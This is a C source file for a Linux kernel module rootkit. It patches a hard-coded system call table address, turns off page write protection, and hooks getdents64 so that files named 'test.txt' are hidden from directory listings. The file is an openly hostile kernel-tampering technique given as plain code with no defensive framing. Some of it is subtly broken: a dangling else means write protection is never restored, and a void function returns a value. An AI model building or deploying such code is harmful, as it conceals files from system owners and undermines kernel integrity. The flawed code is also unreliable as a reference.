#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/moduleparam.h>
#include <linux/unistd.h>
#include <linux/semaphore.h>
#include <linux/dirent.h>
#include <asm/cacheflush.h>

#define FILE_NAME "test.txt"

void **sys_call_table;

asmlinkage int (*getdents64_original) (unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);

asmlinkage int   getdents64_hook      (unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) {
/*
run the actual system call,
loop through the struct returned,
compare filename (linux_dirent64->d_name)
with constant FILE_NAME,
if it matches recalculating
what is being returned

d_reclen: Size of this dirent (directory entry struct)
d_name:   Filename (null-terminated)

nob:  number of bytes (of all dirent structs)
dirp: directory entry struct pointer
cur:  tmp dirp
*/
  int nob = getdents64_original(fd, dirp, count);
  struct linux_dirent64 *cur = dirp;

  int i = 0;
  while(i < nob) {
    int size = cur->d_reclen;

    if(strncmp(cur->d_name, FILE_NAME, strlen(FILE_NAME)) == 0) {
      char *next_rec = (char *)cur + size;
      int len = (uintptr_t)dirp + nob - (uintptr_t)next_rec;
      memmove(cur, next_rec, len);
      nob -= size;
      continue;
    }

    i += size;
    cur = (struct linux_dirent64*) ((char*)dirp + i);
  }

  return nob;
}

int set_page_rw(uintptr_t addr, int f) {
  unsigned int level;
  pte_t *pte = lookup_address(addr, &level);

  if(f == 1)
    if(pte->pte &~ _PAGE_RW)
      pte->pte |= _PAGE_RW;
  else
    pte->pte = pte->pte &~_PAGE_RW;

  return 0;
}

int f_init(void) {
  sys_call_table = (void*)0xffffffff820013a0;

  set_page_rw(sys_call_table, 1);
  getdents64_original = sys_call_table[__NR_getdents64];
  sys_call_table[__NR_getdents64] = getdents64_hook;

  return 0;
}

void f_exit(void) {
  sys_call_table[__NR_getdents64] = getdents64_original;
  set_page_rw(sys_call_table, 0);
  return 0;
}

MODULE_LICENSE("GPL");
module_init(f_init);
module_exit(f_exit);
